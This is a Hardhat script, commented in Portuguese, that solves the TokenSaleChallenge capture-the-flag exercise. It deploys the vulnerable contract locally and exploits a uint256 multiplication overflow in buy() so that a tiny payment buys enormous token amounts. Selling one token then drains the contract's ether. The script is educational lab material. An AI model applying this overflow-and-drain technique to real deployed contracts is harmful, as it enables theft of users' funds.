const hre = require("hardhat");

async function main() {
  console.log("ðŸ” Iniciando exploit do TokenSaleChallenge...\n");

  // O endereÃ§o do contrato pode ser passado como variÃ¡vel de ambiente
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("ðŸ“¦ Nenhum endereÃ§o fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer, player] = await hre.ethers.getSigners();
    
    // Deploy do contrato enviando 1 ether
    const TokenSaleChallenge = await hre.ethers.getContractFactory("challenges/09_math_token_sale/contracts/TokenSaleChallenge.sol:TokenSaleChallenge");
    const challenge = await TokenSaleChallenge.deploy(player.address, {
      value: hre.ethers.parseEther("1.0")
    });
    await challenge.waitForDeployment();
    contractAddress = await challenge.getAddress();
    
    console.log("âœ… Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const TokenSaleChallenge = await hre.ethers.getContractFactory("challenges/09_math_token_sale/contracts/TokenSaleChallenge.sol:TokenSaleChallenge");
  const contract = TokenSaleChallenge.attach(contractAddress);

  // Obter contas
  const [attacker] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const balanceBefore = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteBefore = await contract.isComplete();
  const attackerBalanceBefore = await contract.balanceOf(attacker.address);
  
  console.log("ðŸ“ EndereÃ§o do contrato:", contractAddress);
  console.log("ðŸ‘¤ Atacante:", attacker.address);
  console.log("");
  console.log("ðŸ“Š Estado antes do exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceBefore), "ETH");
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("  - Tokens do atacante:", attackerBalanceBefore.toString());
  console.log("");

  if (isCompleteBefore) {
    console.log("âœ… O desafio jÃ¡ estÃ¡ completo!");
    return;
  }

  // VULNERABILIDADE: Integer overflow na funÃ§Ã£o buy()
  // Em Solidity 0.4.21, nÃ£o hÃ¡ proteÃ§Ã£o contra overflow
  // Podemos fazer numTokens * PRICE_PER_TOKEN fazer overflow
  
  console.log("ðŸ” Explorando integer overflow na funÃ§Ã£o buy()...\n");
  
  // PRICE_PER_TOKEN = 1 ether = 10^18 wei
  // Queremos: numTokens * 1 ether fazer overflow
  // Se numTokens = 2^256 / 1 ether + 1, entÃ£o numTokens * 1 ether vai fazer overflow
  
  // Calcular numTokens que causa overflow
  const PRICE_PER_TOKEN = hre.ethers.parseEther("1.0"); // 1 ether = 10^18 wei
  const MAX_UINT256 = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
  
  // numTokens = (2^256 / PRICE_PER_TOKEN) + 1
  // Isso farÃ¡ com que numTokens * PRICE_PER_TOKEN faÃ§a overflow
  const numTokens = (MAX_UINT256 / PRICE_PER_TOKEN) + 1n;
  
  // Calcular o valor que serÃ¡ enviado (com overflow)
  // numTokens * PRICE_PER_TOKEN vai fazer overflow e resultar em um valor pequeno
  const expectedValue = (numTokens * PRICE_PER_TOKEN) % (MAX_UINT256 + 1n);
  
  console.log("ðŸ“Š CÃ¡lculos do exploit:");
  console.log("  - PRICE_PER_TOKEN:", PRICE_PER_TOKEN.toString(), "wei (1 ether)");
  console.log("  - numTokens:", numTokens.toString());
  console.log("  - numTokens * PRICE_PER_TOKEN (com overflow):", expectedValue.toString(), "wei");
  console.log("  - Valor a enviar:", hre.ethers.formatEther(expectedValue), "ETH");
  console.log("");

  // Fazer a compra com overflow
  console.log("ðŸ’° Comprando tokens com overflow...");
  const buyTx = await contract.buy(numTokens, {
    value: expectedValue
  });
  console.log("ðŸ“¤ Buy transaction enviada:", buyTx.hash);
  await buyTx.wait();
  console.log("âœ… Compra confirmada!\n");
  
  // Verificar tokens recebidos
  const attackerBalanceAfter = await contract.balanceOf(attacker.address);
  console.log("ðŸ“Š Tokens recebidos:", attackerBalanceAfter.toString());
  console.log("");

  // Vender apenas alguns tokens para receber mais do que pagamos
  // O contrato tem 1 ETH inicial + o que pagamos
  // Se vendermos tokens suficientes para receber mais de 1 ETH, o saldo ficarÃ¡ abaixo de 1 ETH
  
  // Queremos receber pelo menos 1 ETH + um pouco mais
  // Para receber 1 ETH, precisamos vender 1 token (1 token * 1 ether = 1 ether)
  // Mas como temos muitos tokens, podemos vender 1 token para receber 1 ETH
  
  console.log("ðŸ’¸ Vendendo 1 token para receber 1 ETH...");
  const tokensToSell = 1n;
  const sellTx = await contract.sell(tokensToSell);
  console.log("ðŸ“¤ Sell transaction enviada:", sellTx.hash);
  await sellTx.wait();
  console.log("âœ… Venda confirmada!\n");
  
  // Verificar saldo intermediÃ¡rio
  const balanceAfterSell = await hre.ethers.provider.getBalance(contractAddress);
  console.log("ðŸ“Š Saldo apÃ³s vender 1 token:", hre.ethers.formatEther(balanceAfterSell), "ETH");
  console.log("");

  // Verificar estado apÃ³s o exploit
  const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteAfter = await contract.isComplete();
  const attackerBalanceFinal = await contract.balanceOf(attacker.address);
  
  console.log("ðŸ“Š Estado apÃ³s o exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceAfter), "ETH");
  console.log("  - Desafio completo:", isCompleteAfter);
  console.log("  - Tokens do atacante:", attackerBalanceFinal.toString());
  
  if (isCompleteAfter) {
    console.log("\nðŸŽ‰ Desafio completado! O integer overflow foi explorado com sucesso");
    console.log("ðŸ’° O contrato agora tem menos de 1 ether");
    console.log("\nðŸ’¡ A vulnerabilidade: Em Solidity 0.4.21, nÃ£o hÃ¡ proteÃ§Ã£o contra overflow.");
    console.log("   Podemos fazer numTokens * PRICE_PER_TOKEN fazer overflow,");
    console.log("   pagando pouco mas recebendo muitos tokens!");
  } else {
    console.log("\nâŒ Algo deu errado. O desafio nÃ£o foi completado.");
    console.log("ðŸ’¡ Verifique os logs acima.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

